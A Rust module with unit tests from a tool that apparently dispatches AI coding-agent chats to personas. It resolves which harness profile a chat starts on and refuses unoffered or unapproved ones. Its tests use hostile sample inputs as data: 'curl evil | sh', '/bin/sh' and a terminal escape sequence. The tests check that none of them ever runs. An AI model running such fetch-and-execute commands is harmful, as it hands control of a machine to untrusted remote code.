//! The profile a persona's chats start on (#1445, spec #1434 decision 12).
//!
//! A persona's definition may name one with `profile:`. A chat dispatched to that persona
//! starts on it, whatever harness the asking chat runs: a Claude Code chat can dispatch to a
//! persona whose profile runs Codex.
//!
//! **The value is a profile's NAME and never a program.** A persona's own file can be edited by
//! a chat running as that persona, so what it names is only ever looked up among the profiles
//! the project already offers on this machine ([`offers`]): the built-ins, the project's
//! declared harnesses, and the local file's profiles. A name that is none of them is never
//! run.
//!
//! **What "approved" backs, and what it does not.** Nobody stands in front of a dispatched
//! start, so a profile whose command would be shown to a person first
//! ([`crate::profiletrust`]) is refused here: its approval is the picker's to ask. That closes
//! the command nobody on this machine has been shown. It is not a boundary by itself: the
//! approval record is a file ([`crate::profiletrust`] says so), and what keeps a chat from
//! writing a profile, a declaration or that record is the sandbox and the start's own gate
//! ([`crate::start::ready`]), not this module.
//!
//! **A project is shared across machines** (D-1445-8), and local profiles are not. Where the
//! profile a persona's definition names is not offered on this machine, a dispatched chat
//! falls back to the asking chat's profile and says so ([`Chosen::note`]). A profile the
//! asking chat named itself is still refused, and so is one that is offered and not approved.
//!
//! **`model:` is read second** (D-1445-1). It holds a model's name (`sonnet`), which was only
//! ever passed into the generated sub-agent file, so it is a profile only where the project
//! offers a profile of exactly that name. A `model:` that names no profile says nothing here
//! and refuses nothing.
//!
//! **`profile: none` names none**, for a persona that inherits a profile along `extends:` and
//! does not want it: its chats start on the asking chat's profile. So no profile called
//! `none` can be named.
//!
//! [`for_dispatch`] is the one answer to "which profile does a dispatched chat start on", and
//! it is pure: every caller hands it what the app recorded and what the project offers.

use std::path::Path;

use crate::shown;

/// The key a persona's definition names its profile with.
pub const KEY: &str = "profile";

/// The older key, read where [`KEY`] is absent and only when it names a profile.
pub const MODEL_KEY: &str = "model";

/// The value of [`KEY`] that names no profile, whatever a parent names.
pub const NONE: &str = "none";

/// How a profile that waits for its approval gets it: the one sentence, said by a refusal and
/// by the persona view.
const APPROVE_IT: &str = "Start one chat on it from the new-chat picker, which shows its \
                          command and asks.";

/// What a persona's definition says about the profile its chats start on, with its `extends:`
/// chain applied: a child's line answers instead of its parent's.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Named {
    /// The persona whose definition this is.
    pub persona: String,
    /// `profile:`, as written. None where no definition of the chain names one, and where the
    /// nearest one says [`NONE`].
    pub profile: Option<String>,
    /// `model:`, as written. A model's name, and a profile only where one is called that. None
    /// where `profile:` says [`NONE`]: that persona opted out of having one.
    pub model: Option<String>,
    /// The ancestor whose `profile:` line this is, where it is not the persona's own.
    pub inherited_from: Option<String>,
}

/// The nearest `profile:` line of `chain` (child first), and whose it is.
fn nearest(root: &Path, chain: &[String]) -> Option<(String, String)> {
    chain.iter().find_map(|who| {
        let pairs = crate::personas::load(root, who)?;
        let value = pairs
            .iter()
            .rev()
            .find(|(key, value)| key == KEY && !value.trim().is_empty())
            .map(|(_, value)| value.trim().to_owned())?;
        Some((value, who.clone()))
    })
}

/// What the definition of `persona` names, or nothing for a persona that does not load.
pub fn named_by(root: &Path, persona: &str) -> Named {
    let chain = crate::personas::lineage(root, persona);
    let mut named = Named {
        persona: persona.to_owned(),
        ..Named::default()
    };
    match nearest(root, &chain) {
        // Opted out: no profile, and no `model:` read in its place.
        Some((value, _)) if value == NONE => return named,
        Some((value, whose)) => {
            named.profile = Some(value);
            named.inherited_from = (whose != persona).then_some(whose);
        }
        None => {}
    }
    named.model = crate::personagrant::resolve(root, persona).and_then(|resolved| {
        resolved
            .get(MODEL_KEY)
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .map(str::to_owned)
    });
    named
}

/// One profile the project offers on this machine.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Offer {
    pub name: String,
    /// The profile's `kind`: the harness it runs.
    pub kind: String,
    /// Whether its command, or the harness declaration it runs on, must be shown to a person
    /// and approved before it runs: new, or changed since it was approved.
    pub needs_approval: bool,
}

/// The profiles of `set` as offers, with `declared` the project's harness declarations as the
/// caller read them: one read for a caller that goes on to start a chat from the same two.
pub fn offers_of(
    root: &Path,
    set: &crate::profiles::ProfileSet,
    declared: &crate::harness_declaration::Declarations,
) -> Vec<Offer> {
    use crate::profiletrust::{declaration_approval_needed_in, profile_approval_needed};
    set.profiles()
        .iter()
        .map(|profile| Offer {
            name: profile.name.clone(),
            kind: profile.kind.clone(),
            needs_approval: profile_approval_needed(root, profile).is_some()
                || declaration_approval_needed_in(root, profile, declared).is_some(),
        })
        .collect()
}

/// Every profile the project at `root` offers: the launch read
/// ([`crate::profiles::for_launch`]), so a profile the project refuses is not among them.
pub fn offers(root: &Path) -> Vec<Offer> {
    let declared = crate::harness_declaration::read(root);
    let (set, _) = crate::profiles::for_launch_in(root, &declared);
    offers_of(root, &set, &declared)
}

/// The profiles a surface that only SHOWS them reads: [`crate::profiles::current`], which does
/// not ask git whether the local file would travel. The persona view draws from this on every
/// read of a persona; nothing that starts a chat or writes a name may.
pub fn offers_shown(root: &Path) -> Vec<Offer> {
    let declared = crate::harness_declaration::read(root);
    let set = crate::profiles::current_of(crate::profiles::derive_in(root, &declared));
    offers_of(root, &set, &declared)
}

/// Who named the profile a start was refused over.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Who {
    /// The asking chat, in its dispatch.
    Asker,
    /// The persona's definition, with `profile:`.
    Persona,
    /// The persona's definition, with `model:`.
    PersonaModel,
    /// Nobody: it is the profile the asking chat itself runs on.
    AskingChat,
}

/// Why no profile was chosen, and nothing is started.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Refused {
    /// The project does not offer a profile of this name on this machine. `persona` is the
    /// persona whose definition named it, where one did.
    NotOffered {
        profile: String,
        by: Who,
        persona: Option<String>,
    },
    /// The project offers it, and its command has not been approved on this machine.
    NotApproved {
        profile: String,
        by: Who,
        persona: Option<String>,
    },
    /// Nobody named a profile and the asking chat is on none.
    NoProfile,
}

impl Refused {
    /// The sentence a chat or a person reads: what was refused, and what to do.
    pub fn say(&self) -> String {
        match self {
            Self::NotOffered {
                profile,
                by,
                persona,
            } => {
                let profile = shown::short(profile);
                let named = by.named(persona.as_deref());
                match by {
                    Who::Asker => format!(
                        "{named} profile '{profile}', which this project does not offer on \
                         this machine, so nothing was started. Name one of the project's \
                         profiles, or none."
                    ),
                    Who::Persona | Who::PersonaModel => format!(
                        "{named} profile '{profile}', which this project does not offer on \
                         this machine, and the asking chat is on no profile to start it on \
                         instead, so nothing was started. Set the persona's profile from its \
                         view, or declare '{profile}' again in Settings › Harness."
                    ),
                    Who::AskingChat => format!(
                        "{named} profile '{profile}', which this project no longer offers on \
                         this machine, so nothing was started. Declare '{profile}' again in \
                         Settings › Harness."
                    ),
                }
            }
            Self::NotApproved {
                profile,
                by,
                persona,
            } => format!(
                "{} profile '{}', and what it runs has not been approved on this machine, so \
                 nothing was started. {APPROVE_IT}",
                by.named(persona.as_deref()),
                shown::short(profile)
            ),
            Self::NoProfile => "the asking chat is not on a harness profile and nobody named \
                                one, so there is no profile to start the new chat on. Nothing \
                                was started."
                .to_owned(),
        }
    }
}

impl Who {
    fn named(self, persona: Option<&str>) -> String {
        let persona = match persona {
            Some(who) => format!("persona '{}'", shown::short(who)),
            None => "the persona".to_owned(),
        };
        match self {
            Self::Asker => "the dispatch names".to_owned(),
            Self::Persona => format!("{persona} names"),
            Self::PersonaModel => format!("{persona} names, with `model:`,"),
            Self::AskingChat => "the asking chat runs on".to_owned(),
        }
    }
}

/// A profile a persona's definition names that this machine does not offer, in whose place
/// the asking chat's was chosen (D-1445-8).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FellBack {
    pub persona: String,
    /// The profile the persona's definition names.
    pub named: String,
}

/// The profile a chat starts on, and whose choice it was.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Chosen {
    pub profile: String,
    pub by: Who,
    /// Set where this is the asking chat's profile standing in for the persona's own.
    pub fell_back: Option<FellBack>,
}

impl Chosen {
    /// The sentence that says a fallback happened, for the dispatch's answer and the new
    /// chat's stamp. None where the profile is the one that was named.
    pub fn note(&self) -> Option<String> {
        let fell = self.fell_back.as_ref()?;
        Some(format!(
            "persona '{}' names profile '{}', which this machine does not offer, so this chat \
             runs on the asking chat's profile, '{}'",
            shown::short(&fell.persona),
            shown::short(&fell.named),
            shown::short(&self.profile)
        ))
    }
}

/// **The profile a dispatched chat starts on.**
///
/// In order: the profile the asking chat `named`, else the target `persona`'s own, else the
/// one the `asking` chat runs on.
///
/// - A profile the asking chat named that is not one of `offered` is a refusal.
/// - A profile that is offered and not approved is a refusal, whoever named it. Starting on
///   another profile than the one named is another account and another harness.
/// - **A persona's own profile that this machine does not offer falls back to the asking
///   chat's** (D-1445-8), and the answer says so ([`Chosen::fell_back`]): the definition is
///   committed and a local profile is one machine's. With no asking profile to fall back to,
///   it is a refusal.
///
/// A persona's `model:` counts as naming a profile only where one of `offered` is called that.
pub fn for_dispatch(
    persona: &Named,
    asking: Option<&str>,
    named: Option<&str>,
    offered: &[Offer],
) -> Result<Chosen, Refused> {
    if let Some(profile) = named {
        return checked(profile, Who::Asker, None, offered);
    }
    let whose = Some(persona.persona.clone()).filter(|name| !name.is_empty());
    let fell_back = match own(persona, offered) {
        Some(Own::Starts { profile, by }) => {
            return Ok(Chosen {
                profile,
                by,
                fell_back: None,
            });
        }
        Some(Own::NotApproved { profile, by }) => {
            return Err(Refused::NotApproved {
                profile,
                by,
                persona: whose,
            });
        }
        Some(Own::NotOffered { profile }) if asking.is_none() => {
            return Err(Refused::NotOffered {
                profile,
                by: Who::Persona,
                persona: whose,
            });
        }
        Some(Own::NotOffered { profile }) => Some(FellBack {
            persona: persona.persona.clone(),
            named: profile,
        }),
        None => None,
    };
    match asking {
        Some(profile) => checked(profile, Who::AskingChat, None, offered).map(|chosen| Chosen {
            fell_back,
            ..chosen
        }),
        None => Err(Refused::NoProfile),
    }
}

/// A persona's own profile, held to what the project offers.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Own {
    /// Offered and approved: a chat starts on it.
    Starts { profile: String, by: Who },
    /// Offered, and its command has not been approved on this machine.
    NotApproved { profile: String, by: Who },
    /// Named with `profile:`, and not offered on this machine.
    NotOffered { profile: String },
}

/// **The persona's own profile**: what its definition names, held to `offered`. `None` where
/// it names none. What the picker preselects and the persona view shows, and
/// [`for_dispatch`]'s second rule.
pub fn own(persona: &Named, offered: &[Offer]) -> Option<Own> {
    let (profile, by) = match (persona.profile.as_deref(), persona.model.as_deref()) {
        (Some(profile), _) => (profile, Who::Persona),
        // A model's name, so only where a profile is called that.
        (None, Some(model)) if offered.iter().any(|offer| offer.name == model) => {
            (model, Who::PersonaModel)
        }
        _ => return None,
    };
    let profile = profile.to_owned();
    Some(match offered.iter().find(|offer| offer.name == profile) {
        None => Own::NotOffered { profile },
        Some(offer) if offer.needs_approval => Own::NotApproved { profile, by },
        Some(_) => Own::Starts { profile, by },
    })
}

/// The profile the new-chat picker starts on when `persona` is picked: its own, where the
/// project offers it. One still waiting for its approval is picked too, because the picker
/// shows its command and asks; one the project does not offer is no row to pick.
pub fn preselected(persona: &Named, offered: &[Offer]) -> Option<String> {
    match own(persona, offered)? {
        Own::Starts { profile, .. } | Own::NotApproved { profile, .. } => Some(profile),
        Own::NotOffered { .. } => None,
    }
}

/// What the persona view says of `persona`'s profile, in one line.
pub fn line(persona: &Named, offered: &[Offer]) -> String {
    let inherited = persona
        .inherited_from
        .as_deref()
        .map(|parent| format!(", inherited from {}", shown::short(parent)))
        .unwrap_or_default();
    match own(persona, offered) {
        None => "none named, so a chat handed to it starts on the asking chat's profile".to_owned(),
        Some(Own::Starts { profile, by }) => {
            let harness = offered
                .iter()
                .find(|offer| offer.name == profile)
                .map(|offer| offer.kind.as_str())
                .filter(|kind| *kind != profile)
                .map(|kind| format!(" ({kind})"))
                .unwrap_or_default();
            let from = if by == Who::PersonaModel {
                ", named by `model:`"
            } else {
                ""
            };
            format!("{}{harness}{from}{inherited}", shown::short(&profile))
        }
        Some(Own::NotApproved { profile, .. }) => format!(
            "{}{inherited}, and what it runs has not been approved on this machine. \
             {APPROVE_IT}",
            shown::short(&profile)
        ),
        Some(Own::NotOffered { profile }) => format!(
            "'{}'{inherited}, which this machine does not offer, so a chat handed to it starts \
             on the asking chat's profile",
            shown::short(&profile)
        ),
    }
}

fn checked(
    profile: &str,
    by: Who,
    persona: Option<String>,
    offered: &[Offer],
) -> Result<Chosen, Refused> {
    match offered.iter().find(|offer| offer.name == profile) {
        None => Err(Refused::NotOffered {
            profile: profile.to_owned(),
            by,
            persona,
        }),
        Some(offer) if offer.needs_approval => Err(Refused::NotApproved {
            profile: profile.to_owned(),
            by,
            persona,
        }),
        Some(offer) => Ok(Chosen {
            profile: offer.name.clone(),
            by,
            fell_back: None,
        }),
    }
}

/// `text`, a persona's definition, with its `profile:` line saying `profile`, or without one
/// for `None`. Every other line is left as written. `None` when `text` has no frontmatter to
/// hold the line.
pub fn with_profile(text: &str, profile: Option<&str>) -> Option<String> {
    let rest = text.strip_prefix("---")?;
    let end = rest.find("---")?;
    let (block, after) = rest.split_at(end);
    let mut lines: Vec<String> = Vec::new();
    let mut placed = false;
    for line in block.split_inclusive('\n') {
        let is_key = line
            .split_once(':')
            .is_some_and(|(key, _)| key.trim() == KEY);
        if !is_key {
            lines.push(line.to_owned());
            continue;
        }
        // The first line is rewritten where it stands; a second one would answer instead of
        // it (a later line wins), so it goes.
        if let (Some(profile), false) = (profile, placed) {
            lines.push(format!("{KEY}: {profile}\n"));
            placed = true;
        }
    }
    if let (Some(profile), false) = (profile, placed) {
        if lines.last().is_some_and(|last| !last.ends_with('\n')) {
            lines.push("\n".to_owned());
        }
        lines.push(format!("{KEY}: {profile}\n"));
    }
    Some(format!("---{}{after}", lines.concat()))
}

/// **Set the profile `persona`'s chats start on**, or name none with `None`, in its own
/// definition. The persona view's control.
///
/// Naming none removes the persona's own line. Where an ancestor still names a profile, the
/// line is written as `profile: none` instead, so the persona opts out of what it inherits and
/// "none" means none.
///
/// A profile the project does not offer on this machine is not written, and so is [`NONE`]
/// as a profile's name. A profile that still needs its approval may be named; the start asks
/// for that, not this.
pub fn set(root: &Path, persona: &str, profile: Option<&str>) -> Result<(), String> {
    if let Some(refused) = crate::personas::name_refusal(root, persona) {
        return Err(refused);
    }
    if let Some(profile) = profile
        && (profile == NONE || !offers(root).iter().any(|offer| offer.name == profile))
    {
        return Err(format!(
            "this project does not offer a profile '{}' on this machine, so nothing was \
             written. Pick one of the project's profiles, or none.",
            shown::short(profile)
        ));
    }
    // What the line says: the profile, or `none` where a parent's would otherwise answer.
    let chain = crate::personas::lineage(root, persona);
    let inherits =
        nearest(root, chain.get(1..).unwrap_or_default()).is_some_and(|(value, _)| value != NONE);
    let line = profile.or(inherits.then_some(NONE));
    let file = crate::personas::def_path(root, persona);
    crate::contain::writable(root, &file).map_err(|refused| refused.to_string())?;
    let text = crate::contain::read_text_no_link(root, &file)
        .map_err(|why| format!("purlis could not read {}: {why}", file.display()))?;
    let Some(next) = with_profile(&text, line) else {
        return Err(format!(
            "{} has no frontmatter to hold a `{KEY}:` line, so nothing was written.",
            file.display()
        ));
    };
    if next == text {
        return Ok(());
    }
    crate::layer::write_whole(&file, &next)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn offer(name: &str, kind: &str) -> Offer {
        Offer {
            name: name.to_owned(),
            kind: kind.to_owned(),
            needs_approval: false,
        }
    }

    fn project() -> Vec<Offer> {
        vec![
            offer("claude", "claude"),
            offer("codex", "codex"),
            offer("work", "claude"),
        ]
    }

    /// The project, and `aider`: offered, and waiting for its approval.
    fn with_aider() -> Vec<Offer> {
        let mut offered = project();
        offered.push(Offer {
            name: "aider".to_owned(),
            kind: "aider".to_owned(),
            needs_approval: true,
        });
        offered
    }

    fn names(profile: Option<&str>, model: Option<&str>) -> Named {
        Named {
            persona: "ops".to_owned(),
            profile: profile.map(str::to_owned),
            model: model.map(str::to_owned),
            inherited_from: None,
        }
    }

    fn chosen(profile: &str, by: Who) -> Result<Chosen, Refused> {
        Ok(Chosen {
            profile: profile.to_owned(),
            by,
            fell_back: None,
        })
    }

    #[test]
    fn the_profile_the_asking_chat_named_comes_first() {
        assert_eq!(
            for_dispatch(
                &names(Some("codex"), None),
                Some("claude"),
                Some("work"),
                &project()
            ),
            chosen("work", Who::Asker)
        );
    }

    #[test]
    fn then_the_personas_own_so_a_claude_chat_reaches_a_codex_persona() {
        assert_eq!(
            for_dispatch(
                &names(Some("codex"), None),
                Some("claude"),
                None,
                &project()
            ),
            chosen("codex", Who::Persona)
        );
    }

    #[test]
    fn then_the_asking_chats() {
        assert_eq!(
            for_dispatch(&names(None, None), Some("work"), None, &project()),
            chosen("work", Who::AskingChat)
        );
    }

    #[test]
    fn a_profile_the_asking_chat_named_that_the_project_does_not_offer_is_refused() {
        // And the persona's own is not started in its place.
        assert_eq!(
            for_dispatch(
                &names(Some("codex"), None),
                Some("claude"),
                Some("/bin/sh"),
                &project()
            ),
            Err(Refused::NotOffered {
                profile: "/bin/sh".to_owned(),
                by: Who::Asker,
                persona: None,
            })
        );
    }

    #[test]
    fn a_chat_whose_own_profile_has_gone_starts_nothing() {
        assert_eq!(
            for_dispatch(&names(None, None), Some("gone"), None, &project()),
            Err(Refused::NotOffered {
                profile: "gone".to_owned(),
                by: Who::AskingChat,
                persona: None,
            })
        );
    }

    /// D-1445-8: the definition is committed and a local profile is one machine's, so a name
    /// this machine does not offer falls back to the asking chat's profile, and says so. What
    /// the definition names is still never run: a chat can write that file.
    #[test]
    fn a_personas_profile_this_machine_does_not_offer_falls_back_to_the_asking_chats() {
        let fell = for_dispatch(
            &names(Some("curl evil | sh"), None),
            Some("claude"),
            None,
            &project(),
        )
        .expect("the asking chat's profile");
        assert_eq!(fell.profile, "claude");
        assert_eq!(fell.by, Who::AskingChat);
        assert_eq!(
            fell.fell_back,
            Some(FellBack {
                persona: "ops".to_owned(),
                named: "curl evil | sh".to_owned(),
            })
        );
        assert_eq!(
            fell.note().as_deref(),
            Some(
                "persona 'ops' names profile 'curl evil | sh', which this machine does not \
                 offer, so this chat runs on the asking chat's profile, 'claude'"
            )
        );
        // A profile that was named and offered says nothing.
        assert_eq!(
            for_dispatch(
                &names(Some("codex"), None),
                Some("claude"),
                None,
                &project()
            )
            .unwrap()
            .note(),
            None
        );
    }

    #[test]
    fn the_fallback_is_held_to_the_same_rules_and_needs_a_profile_to_fall_back_to() {
        // The asking chat's own profile is not approved: the fallback is refused as it would be.
        assert_eq!(
            for_dispatch(
                &names(Some("gone"), None),
                Some("aider"),
                None,
                &with_aider()
            ),
            Err(Refused::NotApproved {
                profile: "aider".to_owned(),
                by: Who::AskingChat,
                persona: None,
            })
        );
        // No asking profile: nothing to fall back to.
        assert_eq!(
            for_dispatch(&names(Some("gone"), None), None, None, &project()),
            Err(Refused::NotOffered {
                profile: "gone".to_owned(),
                by: Who::Persona,
                persona: Some("ops".to_owned()),
            })
        );
    }

    #[test]
    fn a_profile_nobody_approved_is_never_started_this_way_and_never_fallen_back_from() {
        for (persona, named, by, whose) in [
            (names(Some("aider"), None), None, Who::Persona, Some("ops")),
            (
                names(None, Some("aider")),
                None,
                Who::PersonaModel,
                Some("ops"),
            ),
            (names(None, None), Some("aider"), Who::Asker, None),
        ] {
            assert_eq!(
                for_dispatch(&persona, Some("claude"), named, &with_aider()),
                Err(Refused::NotApproved {
                    profile: "aider".to_owned(),
                    by,
                    persona: whose.map(str::to_owned),
                })
            );
        }
    }

    #[test]
    fn a_model_is_a_profile_only_where_one_is_called_that() {
        // `sonnet` is a model's name: it says nothing about a profile, and no fallback is noted.
        assert_eq!(
            for_dispatch(
                &names(None, Some("sonnet")),
                Some("claude"),
                None,
                &project()
            ),
            chosen("claude", Who::AskingChat)
        );
        assert_eq!(
            for_dispatch(
                &names(None, Some("codex")),
                Some("claude"),
                None,
                &project()
            ),
            chosen("codex", Who::PersonaModel)
        );
        // `profile:` answers before it.
        assert_eq!(
            for_dispatch(
                &names(Some("work"), Some("codex")),
                Some("claude"),
                None,
                &project()
            ),
            chosen("work", Who::Persona)
        );
    }

    #[test]
    fn a_chat_on_no_profile_with_nobody_naming_one_starts_nothing() {
        assert_eq!(
            for_dispatch(&names(None, None), None, None, &project()),
            Err(Refused::NoProfile)
        );
        // A persona with its own profile does not need the asking chat's.
        assert_eq!(
            for_dispatch(&names(Some("codex"), None), None, None, &project()),
            chosen("codex", Who::Persona)
        );
    }

    #[test]
    fn a_refusal_names_the_persona_and_the_profile_contained_and_says_what_to_do() {
        let said = Refused::NotOffered {
            profile: "evil\u{1b}[2J".to_owned(),
            by: Who::Persona,
            persona: Some("ops".to_owned()),
        }
        .say();
        assert!(
            said.starts_with("persona 'ops' names profile 'evil"),
            "{said}"
        );
        assert!(!said.contains('\u{1b}'), "{said:?}");
        assert!(
            said.contains("nothing was started")
                && said.contains("Set the persona's profile from its view")
                && said.contains("Settings › Harness"),
            "{said}"
        );
        let asked = Refused::NotOffered {
            profile: "x".to_owned(),
            by: Who::Asker,
            persona: None,
        }
        .say();
        assert!(
            asked.starts_with("the dispatch names profile 'x'")
                && asked.ends_with("Name one of the project's profiles, or none."),
            "{asked}"
        );
        let waits = Refused::NotApproved {
            profile: "aider".to_owned(),
            by: Who::Persona,
            persona: Some("ops".to_owned()),
        }
        .say();
        assert!(
            waits.starts_with("persona 'ops' names profile 'aider'")
                && waits.ends_with("from the new-chat picker, which shows its command and asks."),
            "{waits}"
        );
    }

    #[test]
    fn the_picker_starts_on_a_personas_own_profile_where_the_project_has_one() {
        let offered = with_aider();
        assert_eq!(
            preselected(&names(Some("codex"), None), &offered).as_deref(),
            Some("codex")
        );
        // The picker asks for the approval itself.
        assert_eq!(
            preselected(&names(Some("aider"), None), &offered).as_deref(),
            Some("aider")
        );
        assert_eq!(preselected(&names(Some("gone"), None), &offered), None);
        assert_eq!(preselected(&names(None, Some("sonnet")), &offered), None);
        assert_eq!(preselected(&names(None, None), &offered), None);
    }

    #[test]
    fn the_persona_view_says_which_profile_and_what_happens_with_one_that_cannot_start() {
        let offered = with_aider();
        assert_eq!(line(&names(Some("codex"), None), &offered), "codex");
        assert_eq!(line(&names(Some("work"), None), &offered), "work (claude)");
        assert_eq!(
            line(&names(None, Some("codex")), &offered),
            "codex, named by `model:`"
        );
        assert_eq!(
            line(
                &Named {
                    inherited_from: Some("base".to_owned()),
                    ..names(Some("work"), None)
                },
                &offered
            ),
            "work (claude), inherited from base"
        );
        assert!(line(&names(None, None), &offered).starts_with("none named"));
        // D-1445-8, said where the person reads about the persona.
        assert_eq!(
            line(&names(Some("gone"), None), &offered),
            "'gone', which this machine does not offer, so a chat handed to it starts on the \
             asking chat's profile"
        );
        // The picker's sentence, which says what to do.
        assert_eq!(
            line(&names(Some("aider"), None), &offered),
            "aider, and what it runs has not been approved on this machine. Start one chat on \
             it from the new-chat picker, which shows its command and asks."
        );
    }

    #[test]
    fn the_profile_line_is_set_replaced_and_cleared_and_nothing_else_moves() {
        let text = "---\nname: ops\nrole: Ops\n---\n\n# ops\n\nprofile: not this one\n";
        let set = with_profile(text, Some("codex")).unwrap();
        assert_eq!(
            set,
            "---\nname: ops\nrole: Ops\nprofile: codex\n---\n\n# ops\n\nprofile: not this one\n"
        );
        assert_eq!(
            with_profile(&set, Some("work")).unwrap(),
            "---\nname: ops\nrole: Ops\nprofile: work\n---\n\n# ops\n\nprofile: not this one\n"
        );
        assert_eq!(with_profile(&set, None).unwrap(), text);
        // Two lines: the later one would have answered, so one is left, saying the new value.
        assert_eq!(
            with_profile(
                "---\nprofile: a\nname: ops\nprofile: b\n---\n",
                Some("codex")
            )
            .unwrap(),
            "---\nprofile: codex\nname: ops\n---\n"
        );
        assert_eq!(with_profile("# no frontmatter\n", Some("codex")), None);
    }

    fn a_persona(root: &Path, name: &str, frontmatter: &str) {
        let dir = root.join("personas").join(name);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("persona.md"),
            format!("---\nname: {name}\n{frontmatter}---\n\n# {name}\n"),
        )
        .unwrap();
    }

    #[test]
    fn a_definition_names_its_profile_and_a_child_inherits_it_or_names_its_own() {
        let dir = tempfile::tempdir().unwrap();
        a_persona(dir.path(), "base", "profile: codex\nmodel: sonnet\n");
        a_persona(dir.path(), "child", "extends: base\n");
        a_persona(dir.path(), "own", "extends: base\nprofile: work\n");

        let base = named_by(dir.path(), "base");
        assert_eq!(
            (base.profile.as_deref(), base.model.as_deref()),
            (Some("codex"), Some("sonnet"))
        );
        assert_eq!(base.inherited_from, None);
        let child = named_by(dir.path(), "child");
        assert_eq!(child.persona, "child");
        assert_eq!(child.profile.as_deref(), Some("codex"));
        assert_eq!(child.inherited_from.as_deref(), Some("base"));
        let own = named_by(dir.path(), "own");
        assert_eq!(own.profile.as_deref(), Some("work"));
        assert_eq!(own.inherited_from, None);
        assert_eq!(named_by(dir.path(), "nobody").profile, None);
    }

    /// `profile: none` is how a child opts out of the profile it inherits: no profile, and no
    /// `model:` read in its place, so its chats start on the asking chat's.
    #[test]
    fn a_child_that_says_none_has_no_profile_whatever_its_parent_names() {
        let dir = tempfile::tempdir().unwrap();
        a_persona(dir.path(), "base", "profile: codex\nmodel: codex\n");
        a_persona(dir.path(), "out", "extends: base\nprofile: none\n");

        let out = named_by(dir.path(), "out");
        assert_eq!(
            (out.profile, out.model, out.inherited_from),
            (None, None, None)
        );
        assert_eq!(
            for_dispatch(
                &named_by(dir.path(), "out"),
                Some("claude"),
                None,
                &project()
            ),
            chosen("claude", Who::AskingChat)
        );
    }

    #[test]
    fn setting_a_profile_writes_one_the_project_offers_and_refuses_any_other() {
        let dir = tempfile::tempdir().unwrap();
        a_persona(dir.path(), "ops", "role: Ops\n");

        set(dir.path(), "ops", Some("codex")).unwrap();
        assert_eq!(
            named_by(dir.path(), "ops").profile.as_deref(),
            Some("codex")
        );

        for bad in ["/bin/sh", NONE] {
            let refused = set(dir.path(), "ops", Some(bad)).unwrap_err();
            assert!(
                refused.starts_with("this project does not offer a profile")
                    && refused.contains("nothing was written"),
                "{refused}"
            );
        }
        assert_eq!(
            named_by(dir.path(), "ops").profile.as_deref(),
            Some("codex")
        );

        set(dir.path(), "ops", None).unwrap();
        assert_eq!(named_by(dir.path(), "ops").profile, None);
        let text = std::fs::read_to_string(dir.path().join("personas/ops/persona.md")).unwrap();
        assert!(!text.contains("profile"), "no parent names one: {text}");
        assert!(set(dir.path(), "../ops", Some("codex")).is_err());
    }

    /// M2: "none" on a profile a persona inherits has to mean none. The child gets an explicit
    /// `profile: none`, its parent keeps its own, and picking a profile again replaces the line.
    #[test]
    fn naming_none_on_an_inherited_profile_opts_the_child_out_and_leaves_the_parent_alone() {
        let dir = tempfile::tempdir().unwrap();
        a_persona(dir.path(), "base", "profile: codex\n");
        a_persona(dir.path(), "child", "extends: base\n");
        assert_eq!(
            named_by(dir.path(), "child").profile.as_deref(),
            Some("codex")
        );

        set(dir.path(), "child", None).unwrap();

        let text = std::fs::read_to_string(dir.path().join("personas/child/persona.md")).unwrap();
        assert!(text.contains("\nprofile: none\n"), "{text}");
        assert_eq!(named_by(dir.path(), "child").profile, None);
        assert_eq!(
            named_by(dir.path(), "base").profile.as_deref(),
            Some("codex")
        );

        set(dir.path(), "child", Some("work")).unwrap_err();
        set(dir.path(), "child", Some("claude")).unwrap();
        let child = named_by(dir.path(), "child");
        assert_eq!(child.profile.as_deref(), Some("claude"));
        assert_eq!(child.inherited_from, None);
    }
}
